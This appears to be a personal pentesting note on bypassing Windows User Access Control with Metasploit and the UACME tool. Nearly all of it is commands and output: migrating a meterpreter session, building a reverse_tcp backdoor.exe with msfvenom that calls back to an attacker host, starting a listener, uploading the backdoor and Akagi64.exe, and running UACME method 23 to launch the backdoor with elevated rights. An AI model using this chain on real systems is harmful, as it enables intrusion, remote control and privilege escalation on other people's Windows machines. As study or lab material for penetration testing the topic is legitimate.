User Access Control
![[Pasted image 20241116172252.png]]
Tool: https://github.com/hfiref0x/UACME
# Metasploit
When you have a meterpreter session on the target:
```bash
meterpreter > pgrep explorer
2396
meterpreter > migrate 2396
[*] Migrating from 2960 to 2396...
[*] Migration completed successfully.
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```
You can see that we dont have admin perms
## Generate the payload
```bash
$> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.49.9 LPORT=1234 -f exe > backdoor.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```
## Setup listener
```bash
mmsf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.49.9
lhost => 10.10.49.9
msf6 exploit(multi/handler) > set lport 1234
lport => 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.49.9:1234 
```
## Upload payloads
```bash
meterpreter > cd C:\\
meterpreter > mkdir temp
Creating directory: temp
[-] stdapi_fs_mkdir: Operation failed: Cannot create a file when that file already exists.
cdmeterpreter > cd temp\\
meterpreter > upload backdoor.exe
[*] Uploading  : /root/backdoor.exe -> backdoor.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/backdoor.exe -> backdoor.exe
[*] Completed  : /root/backdoor.exe -> backdoor.exe
meterpreter > upload /root/Desktop/tools/UACME/Akagi64.exe
[*] Uploading  : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] Uploaded 194.50 KiB of 194.50 KiB (100.0%): /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] Completed  : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
meterpreter > shell
C:\temp>.\Akagi64.exe 23 .\backdoor.exe
.\Akagi64.exe 23 .\backdoor.exe
```